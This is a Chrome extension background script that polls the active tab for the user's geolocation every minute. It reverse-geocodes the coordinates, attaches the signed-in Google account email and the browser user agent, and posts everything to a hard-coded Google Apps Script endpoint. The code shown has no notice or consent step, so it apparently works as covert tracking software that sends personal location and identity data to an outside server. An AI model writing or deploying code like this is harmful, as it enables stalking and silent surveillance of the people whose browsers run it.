const serverURL = 'https://script.google.com/macros/s/AKfycbyOfWynyBsjhuad7aaGifstsXe57SChLp4-ATKO_2-BfAvfw-DGPdZPFSHzITJ5iKpC/exec';
const intervalInMinutes = 1;

// Function to send location data to the Google Apps Script web app
async function sendLocation(locationInfo) {
  try {
    await fetch(serverURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(locationInfo),
    });
  } catch (error) {
    console.error('Failed to send location:', error);
  }
}

// Function to fetch user's email and then send location data
async function fetchUserInfoAndSendLocation(locationInfo) {
  chrome.identity.getProfileUserInfo(userInfo => {
    console.log("User Info:", userInfo); // This will log the fetched user information
    if (userInfo.email) {
      console.log("Email fetched successfully:", userInfo.email);
    } else {
      console.log("Email not available.");
    }
    if (userInfo.email) {
      locationInfo.email = userInfo.email;
    }

    // Add user agent to the locationInfo
    locationInfo.userAgent = navigator.userAgent;

    // Now send the enriched locationInfo to the server
    sendLocation(locationInfo);
  });
}

// Receive the message from the content script and process the location data
chrome.runtime.onMessage.addListener(async (message) => {
  if (message.location) {
    const { latitude, longitude } = message.location;
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
    const locationData = await response.json();

    const city = locationData.address.city || locationData.address.town || locationData.address.village;
    const state = locationData.address.state;
    const country = locationData.address.country;

    const locationInfo = {
      latitude,
      longitude,
      city,
      state,
      country,
      // userAgent is added in fetchUserInfoAndSendLocation
      // email will be added if available in fetchUserInfoAndSendLocation
    };

    // Fetch user info (including email) and then send location data
    fetchUserInfoAndSendLocation(locationInfo);
  }
});

// Periodically send the latest location data to the server
setInterval(() => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs[0]) {
      chrome.tabs.sendMessage(tabs[0].id, { action: 'getLocation' });
    }
  });
}, intervalInMinutes * 60 * 1000);
